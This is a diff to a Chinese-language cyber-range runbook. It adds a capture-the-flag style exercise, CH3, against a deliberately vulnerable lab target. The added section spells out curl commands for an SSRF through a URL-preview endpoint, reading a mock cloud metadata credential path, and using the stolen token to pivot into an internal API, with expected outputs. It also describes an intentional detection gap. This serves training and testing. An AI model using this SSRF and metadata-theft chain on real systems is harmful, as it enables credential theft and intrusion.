@@ -1,9 +1,9 @@
-# Runbook —— 靶機真攻擊鏈（票 #44 / #45 / #46；CH2 見 #153）
+# Runbook —— 靶機真攻擊鏈（票 #44 / #45 / #46；CH2/CH3 見 #153）
 
 單機縱深攻擊鏈：**HTTP SQLi → 撈 dbadmin 帳密 → 直連 :3306 → 讀 flag**（CH1）。
 本檔是操作與驗收手冊；結構契約由 `tests/deploy/test_target_attack_surface.py`（T1，在 CI）證，
 真打進去／真拿 flag／真重烤由下方 T4 在大主機證。CH2（校園海報上傳 → Web Shell →
-本機提權）見本檔下方獨立段落。
+本機提權）與 CH3（網址預覽 SSRF → metadata 憑證竊取 → API pivot）見本檔下方獨立段落。
 
 ## 操作規則（先讀這條）
 
@@ -163,6 +163,66 @@ docker exec range-red1 curl -s -o /dev/null -w '%{http_code}\n' -X POST \
 # 一般圖片副檔名：render 不執行，只回靜態字串
 docker exec range-red1 curl -s "http://10.167.20.10/poster/render?name=real.png"
 #   → "rendered real.png"（不是程式碼執行結果）
+```
+
+---
+
+# CH3 The Stolen Key —— 校園網址預覽 SSRF（#153 Campaign Pack v1）
+
+單機縱深攻擊鏈：**網址預覽功能無目的地白名單 → 借伺服器的手打 loopback-only 的
+metadata service → 讀出偽造雲端憑證 → 用憑證 pivot 進內部 API**。全程唯讀，
+`reset_scope=exercise`，不需要重跑 range-up 就能重新演練。結構契約與**真攻擊鏈本身**
+都由 `tests/deploy/test_range_target_ssrf.py`（真 HTTP round-trip，不需要 VM，在 CI）證
+——CH3 不像 CH2 需要真的多使用者 Linux 提權語意，SSRF＋metadata 竊取＋API pivot
+純粹是 HTTP 層邏輯，CI 本身就是完整驗收，不需要額外的 bake 期自證或 T4 大主機驗證。
+
+## 二分：可計分 vs fixture
+
+| 端點 | 類別 | 說明 |
+|---|---|---|
+| `/preview` `/internal/reports` | **可計分**（#153 CH3） | 真 SSRF 信任邊界漏洞，紅隊要真的打 |
+| `127.0.0.1:8169`（metadata service） | 攻擊面的一部分 | 只 bind loopback，外部連不到；唯一入口是被 SSRF 借用 |
+| `/exec` `/readsecret` `/uncovered` `/healthz`、`/poster/*` | fixture / CH2 | 與 CH1/CH2 共用，行為不變 |
+
+## 攻擊面的信任邊界（為什麼「幫你抓網址」很危險）
+
+- `/preview?url=<raw>` 對任意使用者提供的 URL 直接發出伺服器端請求 —— **沒有任何
+  目的地白名單/黑名單**，這是漏洞本身，不是某個弱檢查被繞過。
+- 靶機另外在 `127.0.0.1:8169`（`TARGET_METADATA_PORT`）跑一個模仿雲端 IMDS 形狀的
+  小服務，只 bind loopback。外部網路連不到它——唯一能碰到它的是靶機自己，而
+  `/preview` 正好能讓靶機「自己」去打它。
+- `/internal/reports` 要求 `X-Internal-Token` 對上 metadata service 吐出來的憑證
+  才放行，模擬「拿竊得的雲端憑證橫向 pivot 到別的內部服務」（T1550）。這一步
+  **刻意沒有偵測覆蓋**——遙測看得到請求記錄，但沒有 Grafana 規則會為它告警
+  （`tests/scenarios/test_ch3_campus_preview_metadata_pivot.py` 的
+  `test_api_pivot_is_an_intentional_detection_gap` 釘住這件事）。
+
+## 真環境操作（compose / 大主機皆可，全程唯讀不需要重跑 range-up）
+
+```bash
+# 第一跳：讀 metadata service 的角色名（借伺服器的手打 loopback）
+curl -s "http://10.167.20.10/preview?url=http://127.0.0.1:8169/latest/meta-data/iam/security-credentials/"
+#   → campus-portal-role
+
+# 第二跳：拿角色名讀出偽造憑證
+curl -s "http://10.167.20.10/preview?url=http://127.0.0.1:8169/latest/meta-data/iam/security-credentials/campus-portal-role"
+#   → {"Code":"Success",...,"Token":"campus-internal-9f2b7d",...}
+
+# 第三跳：拿竊得的 Token 打內部 API
+curl -s "http://10.167.20.10/internal/reports" -H "X-Internal-Token: campus-internal-9f2b7d"
+#   → internal reports: campus enrollment figures q3...
+```
+
+## 負向驗收
+
+```bash
+# 沒有 token：403
+curl -s -o /dev/null -w '%{http_code}\n' "http://10.167.20.10/internal/reports"
+#   → 403
+
+# metadata service 對外網段連不到（只 bind 127.0.0.1，這條應該直接連線失敗/逾時，
+# 而不是拿到回應——證明「唯一入口是 SSRF」這件事，不是靶機防火牆規則造成的假象）
+curl -s -m 3 "http://10.167.20.10:8169/latest/meta-data/iam/security-credentials/" || echo "連不到（預期行為）"
 ```
 
 ## T3 —— range 契約（防火牆）
